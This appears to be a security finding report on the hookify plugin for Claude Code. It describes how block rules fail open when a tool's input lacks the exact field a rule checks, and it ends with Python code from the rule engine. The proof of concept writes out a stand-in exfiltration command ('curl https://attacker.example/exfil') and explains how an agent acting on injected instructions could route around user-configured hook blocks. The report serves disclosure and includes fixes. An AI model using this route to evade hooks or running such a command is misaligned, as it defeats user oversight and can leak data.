The report describes a **registry/fallback-mapping bypass**: when an action can't be matched to a known `(target, selector)` pair, the code silently falls back to a much weaker enforcement path. The closest genuine analog in this repository is in the `hookify` plugin's rule engine, which drives user-authored `PreToolUse`/`PostToolUse` block rules — a real trust boundary for command approval and hook enforcement.

### Title
Hookify security rules silently fail to enforce (`action: block`) against any tool whose input schema doesn't match the hardcoded field map - (File: `plugins/hookify/core/rule_engine.py`)

### Summary
`RuleEngine._extract_field()` only knows how to pull a condition's target field (e.g. `command`) out of `tool_input` for four hardcoded tool names — `Bash`, `Write`, `Edit`, `MultiEdit` — plus a direct dict-key lookup. Any tool call whose relevant parameter is not literally present under the condition's field name, and whose `tool_name` is not one of those four, causes `_extract_field` to return `None`, which makes `_check_condition` immediately return `False`. A rule with `action: block` therefore never fires, and the operation proceeds unrestricted — mirroring the reported bug's fallback to a much weaker default when a lookup misses.

### Finding Description
`_rule_matches()` requires every condition to pass to consider a rule matched: [1](#0-0) 

Condition evaluation depends on `_extract_field`, whose only paths to a non-`None` result are: (1) an exact `field` key present in `tool_input`, or (2) a small hardcoded set of tool-specific mappings: [2](#0-1) 

If neither path matches — e.g., an MCP server tool or any custom/plugin tool that runs an equivalent dangerous action but names its parameter differently (`cmd`, `shell`, `args`, a nested object, etc.) — `_extract_field` returns `None`: [3](#0-2) 

This causes `_check_condition` to return `False` unconditionally, regardless of how dangerous the actual underlying action is, so the rule is treated as "not matched" rather than "matched and blocked." The `PreToolUse` entrypoint that drives this is: [4](#0-3) 

The `tool_matcher` check (`_matches_tool`, which does exact tool-name matching or `*`) can be satisfied with a wildcard, but even then the condition-field extraction gap remains the deciding factor — a `tool_matcher: "*"` rule targeting `field: command` still silently no-ops on any tool lacking a literal `command` key.

### Impact Explanation
Any user (or an agent acting on attacker-influenced/injected instructions) that has hookify block-rules configured to prevent dangerous operations (destructive commands, credential exfiltration, path traversal, etc.) can have that enforcement completely bypassed by routing the equivalent action through a tool whose input schema doesn't literally expose the field the rule checks. Because hookify hooks are explicitly documented as a command-approval/hook-enforcement mechanism, this is a fail-open bypass of a user-configured security control — the same "unmapped input → weakest fallback (here, no enforcement at all)" pattern as the reported fee bug, just applied to Claude Code's tool-authorization/hook trust boundary instead of a fee calculation.

### Likelihood Explanation
Likelihood is moderate-to-high for setups with MCP servers or plugin-provided tools alongside hookify rules: rule authors naturally write conditions against the field names they see for `Bash`/`Edit`/`Write` (the documented, common tools), and have no visibility into the fact that any other tool with a differently-named parameter is exempt from evaluation by construction. No special privilege is needed to trigger this — it happens automatically whenever a covered dangerous action is expressed through an uncovered tool shape.

### Recommendation
Do not treat `None` field extraction as an automatic non-match for `block`/`warn` purposes. Options: (1) fail closed for `action: block` rules by scanning all string-valued entries in `tool_input` when the intended field is not present verbatim, rather than returning `None`; (2) let rule authors declare a list of field aliases; (3) at minimum, warn/log when a `block` rule's tool_matcher matches a tool call but the target field can't be extracted, so the gap is visible instead of silent.

### Proof of Concept
1. Configure a hookify rule at `.claude/hookify.block-exfil.local.md` with `tool_matcher: "*"`, `action: block`, and a condition `field: command`, `operator: regex_match`, `pattern: "curl .*attacker\.example"`.
2. Invoke a tool whose `tool_input` carries the equivalent shell invocation under a different key, e.g. an MCP tool `mcp__custom__run` with `tool_input: {"shell": "curl https://attacker.example/exfil"}`.
3. In `_extract_field`, `field in tool_input` is `False` (`command` not in `{"shell": ...}`), and `tool_name` (`mcp__custom__run`) matches none of `Bash`/`Write`/`Edit`/`MultiEdit`, so `None` is returned.
4. `_check_condition` returns `False`; the rule never matches; `evaluate_rules` returns `{}` (allow), and the equivalent dangerous command executes with no block, despite the rule being correctly authored and enabled. [5](#0-4)

    def evaluate_rules(self, rules: List[Rule], input_data: Dict[str, Any]) -> Dict[str, Any]:
        """Evaluate all rules and return combined results.

        Checks all rules and accumulates matches. Blocking rules take priority
        over warning rules. All matching rule messages are combined.

        Args:
            rules: List of Rule objects to evaluate
            input_data: Hook input JSON (tool_name, tool_input, etc.)

        Returns:
            Response dict with systemMessage, hookSpecificOutput, etc.
            Empty dict {} if no rules match.
        """
        hook_event = input_data.get('hook_event_name', '')
        blocking_rules = []
        warning_rules = []

        for rule in rules:
            if self._rule_matches(rule, input_data):
                if rule.action == 'block':
                    blocking_rules.append(rule)
                else:
                    warning_rules.append(rule)

        # If any blocking rules matched, block the operation
        if blocking_rules:
            messages = [f"**[{r.name}]**\n{r.message}" for r in blocking_rules]
            combined_message = "\n\n".join(messages)

            # Use appropriate blocking format based on event type
            if hook_event == 'Stop':
                return {
                    "decision": "block",
                    "reason": combined_message,
                    "systemMessage": combined_message
                }
            elif hook_event in ['PreToolUse', 'PostToolUse']:
                return {
                    "hookSpecificOutput": {
                        "hookEventName": hook_event,
                        "permissionDecision": "deny"
                    },
                    "systemMessage": combined_message
                }
            else:
                # For other events, just show message
                return {
                    "systemMessage": combined_message
                }

        # If only warnings, show them but allow operation
        if warning_rules:
            messages = [f"**[{r.name}]**\n{r.message}" for r in warning_rules]
            return {
                "systemMessage": "\n\n".join(messages)
            }

        # No matches - allow operation
        return {}

        # Evaluate rules
